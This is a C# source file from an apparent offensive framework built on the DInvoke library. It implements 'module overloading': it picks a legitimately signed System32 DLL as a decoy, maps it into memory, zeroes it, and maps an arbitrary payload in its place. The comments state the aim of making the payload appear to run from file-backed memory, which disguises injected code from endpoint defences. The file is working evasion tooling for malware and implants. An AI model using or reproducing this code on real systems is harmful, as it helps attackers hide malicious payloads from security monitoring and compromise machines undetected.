﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;

using Data = Apollo.Api.DInvoke.Data;
using Utilities = Apollo.Api.DInvoke.Utilities;
using DynamicInvoke = Apollo.Api.DInvoke.DynamicInvoke;

namespace Apollo.Api.DInvoke.ManualMap
{
    public class Overload
    {
        /// <summary>
        /// Locate a signed module with a minimum size which can be used for overloading.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="MinSize">Minimum module byte size.</param>
        /// <param name="LegitSigned">Whether to require that the module be legitimately signed.</param>
        /// <returns>
        /// String, the full path for the candidate module if one is found, or an empty string if one is not found.
        /// </returns>
        public static string FindDecoyModule(long MinSize, bool LegitSigned = true)
        {
            string SystemDirectoryPath = Environment.GetEnvironmentVariable("WINDIR") + Path.DirectorySeparatorChar + "System32";
            List<string> files = new List<string>(Directory.GetFiles(SystemDirectoryPath, "*.dll"));
            foreach (ProcessModule Module in System.Diagnostics.Process.GetCurrentProcess().Modules)
            {
                if (files.Any(s => s.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)))
                {
                    files.RemoveAt(files.FindIndex(x => x.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)));
                }
            }

            //Pick a random candidate that meets the requirements

            Random r = new Random();
            //List of candidates that have been considered and rejected
            List<int> candidates = new List<int>();
            while (candidates.Count != files.Count)
            {
                //Iterate through the list of files randomly
                int rInt = r.Next(0, files.Count);
                string currentCandidate = files[rInt];

                //Check that the size of the module meets requirements
                if (candidates.Contains(rInt) == false &&
                    new FileInfo(currentCandidate).Length >= MinSize)
                {
                    //Check that the module meets signing requirements
                    if (LegitSigned == true)
                    {
                        if (Utilities.Utilities.FileHasValidSignature(currentCandidate) == true)
                            return currentCandidate;
                        else
                            candidates.Add(rInt);
                    }
                    else
                        return currentCandidate;
                }
                candidates.Add(rInt);
            }
            return string.Empty;
        }

        /// <summary>
        /// Load a signed decoy module into memory, creating legitimate file-backed memory sections within the process. Afterwards overload that
        /// module by manually mapping a payload in it's place causing the payload to execute from what appears to be file-backed memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
        /// <param name="PayloadPath">Full path to the payload module on disk.</param>
        /// <param name="DecoyModulePath">Optional, full path the decoy module to overload in memory.</param>
        /// <returns>PE.PE_MANUAL_MAP</returns>
        public static Data.PE.PE_MANUAL_MAP OverloadModule(string PayloadPath, string DecoyModulePath = null, bool LegitSigned = true)
        {
            // Get approximate size of Payload
            if (!File.Exists(PayloadPath))
            {
                throw new InvalidOperationException("Payload filepath not found.");
            }
            byte[] Payload = File.ReadAllBytes(PayloadPath);

            return OverloadModule(Payload, DecoyModulePath, LegitSigned);
        }

        /// <summary>
        /// Load a signed decoy module into memory creating legitimate file-backed memory sections within the process. Afterwards overload that
        /// module by manually mapping a payload in it's place causing the payload to execute from what appears to be file-backed memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
        /// <param name="Payload">Full byte array for the payload module.</param>
        /// <param name="DecoyModulePath">Optional, full path the decoy module to overload in memory.</param>
        /// <returns>PE.PE_MANUAL_MAP</returns>
        public static Data.PE.PE_MANUAL_MAP OverloadModule(byte[] Payload, string DecoyModulePath = null, bool LegitSigned = true)
        {
            // Did we get a DecoyModule?
            if (!string.IsNullOrEmpty(DecoyModulePath))
            {
                if (!File.Exists(DecoyModulePath))
                {
                    throw new InvalidOperationException("Decoy filepath not found.");
                }
                byte[] DecoyFileBytes = File.ReadAllBytes(DecoyModulePath);
                if (DecoyFileBytes.Length < Payload.Length)
                {
                    throw new InvalidOperationException("Decoy module is too small to host the payload.");
                }
            }
            else
            {
                DecoyModulePath = FindDecoyModule(Payload.Length);
                if (string.IsNullOrEmpty(DecoyModulePath))
                {
                    throw new InvalidOperationException("Failed to find suitable decoy module.");
                }
            }

            // Map decoy from disk
            Data.PE.PE_MANUAL_MAP DecoyMetaData = Map.MapModuleFromDisk(DecoyModulePath);
            IntPtr RegionSize = DecoyMetaData.PEINFO.Is32Bit ? (IntPtr)DecoyMetaData.PEINFO.OptHeader32.SizeOfImage : (IntPtr)DecoyMetaData.PEINFO.OptHeader64.SizeOfImage;

            // Change permissions to RW
            DynamicInvoke.Native.NtProtectVirtualMemory((IntPtr)(-1), ref DecoyMetaData.ModuleBase, ref RegionSize, Data.Win32.WinNT.PAGE_READWRITE);

            // Zero out memory
            DynamicInvoke.Native.RtlZeroMemory(DecoyMetaData.ModuleBase, (int)RegionSize);

            // Overload module in memory
            Data.PE.PE_MANUAL_MAP OverloadedModuleMetaData = Map.MapModuleToMemory(Payload, DecoyMetaData.ModuleBase);
            OverloadedModuleMetaData.DecoyModule = DecoyModulePath;

            return OverloadedModuleMetaData;
        }
    }
}